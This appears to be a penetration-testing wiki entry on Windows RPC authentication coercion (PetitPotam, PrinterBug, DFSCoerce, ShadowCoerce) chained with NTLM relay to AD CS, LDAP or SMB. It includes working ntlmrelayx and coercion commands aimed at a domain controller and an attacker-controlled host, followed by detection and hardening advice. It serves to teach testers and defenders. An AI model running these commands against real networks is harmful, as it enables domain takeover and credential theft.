---
title: MS-RPC coercion
slug: ms-rpc-abuse
---

> **TL;DR:** Several Windows RPC interfaces accept a UNC path from a caller and dutifully authenticate to it as the *server's* machine account. Combined with NTLM relay (to LDAP, AD CS HTTP, or another SMB target) this turns "any authenticated user" into "DA-equivalent" without ever cracking a password.

## What it is
RPC methods like `EfsRpcOpenFileRaw` (MS-EFSR / PetitPotam), `RpcRemoteFindFirstPrinterChangeNotificationEx` (MS-RPRN / PrinterBug), `NetrDfsRemoveStdRoot` (MS-DFSNM / DFSCoerce), and `IsPathShadowCopied` (MS-FSRVP / ShadowCoerce) take a path argument and trigger a callback. The callback authenticates to whatever host the path points to using the SYSTEM machine account of the coerced server. None of these methods require special privileges to invoke — domain user is enough.

## Preconditions / where it applies
- Domain user credential (any)
- Coercion target reachable on RPC: SMB pipe (TCP/445 + named pipe) or direct RPC endpoint
- Relay target accepting NTLM with no/weak signing/EPA:
  - LDAP/LDAPS on a DC (without LDAP signing → write `msDS-AllowedToActOnBehalfOfOtherIdentity` for [[resource-based-constrained-delegation]])
  - AD CS Web Enrollment (without EPA → ESC8 → machine cert)
  - SMB on another host (without signing → SYSTEM shell)

## Technique
The standard chain: start ntlmrelayx, then coerce.

```bash
# Terminal 1 — relay coerced auth to AD CS web enrollment (ESC8)
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

Trigger with the appropriate tool against the DC:

```bash
# PetitPotam (MS-EFSR)
PetitPotam.py -u alice -p Pass attacker.lan dc01.corp.local

# PrinterBug (MS-RPRN) — requires spooler service running
printerbug.py corp.local/alice:Pass@dc01.corp.local attacker.lan

# DFSCoerce (MS-DFSNM)
dfscoerce.py -u alice -p Pass attacker.lan dc01.corp.local

# ShadowCoerce (MS-FSRVP)
shadowcoerce.py -u alice -p Pass attacker.lan dc01.corp.local
```

The DC connects to `attacker.lan` via SMB/HTTP, ntlmrelayx forwards the NTLM auth to the AD CS HTTP endpoint, the CA issues a DomainController certificate, ntlmrelayx hands it back. PKINIT with the cert → TGT for `DC01$` → DCSync.

For LDAP relay (the RBCD path), aim ntlmrelayx at `ldap://dc01` with `--delegate-access` to write the trust attribute on a victim computer object you control.

Coercion+relay is also the canonical "from low-priv to compromised" play during a pentest with a fresh user shell and no creds — Coercer aggregates all known methods into a single sweep.

## Detection and defence
- Enable LDAP Signing + Channel Binding (KB5021130) and SMB signing required everywhere; turn on EPA for AD CS HTTP
- Patch PetitPotam (KB5005413) and disable NTLM where possible — Windows Server 2025 ships Kerberos-only relay mitigations
- Disable the Print Spooler on DCs and any server that doesn't need it
- Detect outbound SMB/HTTP from DCs to non-DC hosts, RPC calls to `\PIPE\efsrpc` / `\PIPE\spoolss` / `\PIPE\netdfs` from non-admin sessions

## References
- [Coercer](https://github.com/p0dalirius/Coercer) — sweeps every known coercion vector
- [HackTricks — coerced auth](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html) — practical chain reference
- [Hacker Recipes — coerced authentications](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications) — protocol-by-protocol breakdown
- See also: [[ntlm]], [[ntlm-relay-ws2025-mitigations]], [[resource-based-constrained-delegation]], [[adcs-attacks]]
